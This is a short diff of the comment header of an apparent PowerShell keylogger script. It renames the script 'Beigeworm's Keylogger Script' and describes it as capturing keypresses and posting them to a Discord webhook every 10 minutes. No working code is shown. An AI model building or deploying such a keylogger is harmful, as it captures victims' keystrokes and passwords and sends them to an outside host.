@@ -1,10 +1,10 @@
 ﻿
 
 <#
-============================================= Key Record Script ========================================================
+============================================= Beigeworm's Keylogger Script ========================================================
 
 SYNOPSIS
-This script gathers Keypress information and posts to a discord webhook address with the results.
+This script gathers Keypress information and posts to a discord webhook address with the results every 10 minutes.
 
 USAGE
 1. Input your credentials below
